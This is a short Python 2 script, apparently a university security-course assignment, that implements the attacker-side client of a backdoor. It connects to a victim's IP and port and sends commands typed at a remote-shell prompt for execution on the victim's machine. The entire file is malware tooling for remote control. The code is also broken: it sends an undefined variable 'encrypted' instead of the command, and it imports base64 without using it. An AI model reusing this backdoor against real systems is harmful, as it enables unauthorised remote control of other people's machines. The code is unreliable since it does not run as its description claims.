#!/usr/bin/python
'''
COMP 8505 - Assignment 3
Backdoor - Client (Attacker) by Jeffrey Sasaki

The client program will allow remote access to the victim's machine, allowing
the user to execute linux commands on the victims machine.

The program will output the executed command given by the victim.
'''

import socket
import base64
import os
import optparse
import sys

# parse command line argument
parser = optparse.OptionParser("usage: python client.py -d <host ip> -p <port>")
parser.add_option('-d', dest='host', type = 'string', help = 'target host IP')
parser.add_option('-p', dest='port', type = 'int', help = 'target port')
(options, args) = parser.parse_args()
if (options.host == None):
    print parser.usage
    sys.exit()
elif (options.port == None):
    print parser.usage
    sys.exit()
else:
    host = options.host
    port = options.port

# connect to the server host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# main
while True:
    data = s.recv(1024)

    # print command
    print data

    # get command
    cmd = raw_input("[remote shell]$ ")

    # send command
    s.send(encrypted)
        
    # check if user typed "exit" to leave remote shell
    if cmd == "exit":
        break
s.close()
sys.exit()
